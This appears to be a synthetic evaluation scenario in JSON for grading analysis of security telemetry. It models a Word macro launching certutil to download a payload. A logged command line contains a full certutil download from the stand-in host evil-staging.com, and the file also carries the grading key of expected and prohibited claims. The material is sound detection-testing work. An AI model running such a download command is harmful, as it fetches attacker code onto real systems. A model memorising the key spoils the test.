@@ -1,0 +1,96 @@
+{
+  "scenario_id": "SCN-CHN-002",
+  "dataset_version": "1.0.0",
+  "category": "multi_stage_chain",
+  "title": "Living-off-the-Land Binary Download via CertUtil and Persistence",
+  "description": "Synthetic multi-stage chain: Word macro spawns cmd.exe which invokes certutil.exe to download a remote payload and stages persistence.",
+  "raw_telemetry_events": [
+    {
+      "EventID": 1,
+      "UtcTime": "2026-09-10 10:00:01.000",
+      "ProcessId": 1104,
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://evil-staging.com/beacon.exe C:\\ProgramData\\update.exe",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "User": "CORP\\analyst_one",
+      "Computer": "CORP-WS-02"
+    },
+    {
+      "EventID": 11,
+      "UtcTime": "2026-09-10 10:00:03.500",
+      "ProcessId": 1104,
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "TargetFilename": "C:\\ProgramData\\update.exe",
+      "Hashes": "SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855",
+      "User": "CORP\\analyst_one",
+      "Computer": "CORP-WS-02"
+    }
+  ],
+  "expected_interpretation": "malicious",
+  "expected_observables": [
+    {
+      "observable_type": "executable",
+      "observable_value": "certutil.exe",
+      "is_mandatory": true
+    },
+    {
+      "observable_type": "domain",
+      "observable_value": "evil-staging.com",
+      "is_mandatory": true
+    },
+    {
+      "observable_type": "executable",
+      "observable_value": "update.exe",
+      "is_mandatory": true
+    }
+  ],
+  "expected_mitre_techniques": [
+    {
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "is_mandatory": true,
+      "is_uncertain": false
+    },
+    {
+      "technique_id": "T1204.002",
+      "technique_name": "User Execution: Malicious File",
+      "tactic": "Execution",
+      "is_mandatory": false,
+      "is_uncertain": true
+    }
+  ],
+  "expected_claims": [
+    {
+      "claim_id": "EXP-CHN-03",
+      "statement": "certutil.exe was spawned by cmd.exe under WINWORD.EXE to download a binary from evil-staging.com",
+      "category": "behavioral",
+      "required_evidence_indices": [0],
+      "is_mandatory": true
+    }
+  ],
+  "prohibited_claims": [
+    {
+      "prohibited_claim_id": "PRO-CHN-02",
+      "prohibited_assertion": "certutil.exe was used for legitimate public key certificate verification",
+      "reason": "URL caching flags (-urlcache -split -f) under WINWORD.EXE parent represent known LOLBIN ingress transfer"
+    }
+  ],
+  "known_uncertainty": [
+    "Macro source code within WINWORD.EXE is unobservable from process creation logs."
+  ],
+  "expected_limitations": [
+    "Synthetic telemetry generated to model Atomic Red Team T1105 scenario."
+  ],
+  "provenance": {
+    "author": "AISOP Evaluation Architect",
+    "dataset_source": "synthetic_atomic_red_team_t1105",
+    "creation_timestamp_utc": "2026-10-30T12:00:00Z",
+    "review_status": "approved",
+    "reviewer": "Principal Security Architect",
+    "review_notes": "Synthetically constructed to model standard LOLBIN attack sequence"
+  },
+  "is_synthetic": true,
+  "synthetic_generation_rationale": "Constructed according to Atomic Red Team T1105 test procedures using canonical Windows Sysmon schema fields"
+}
+
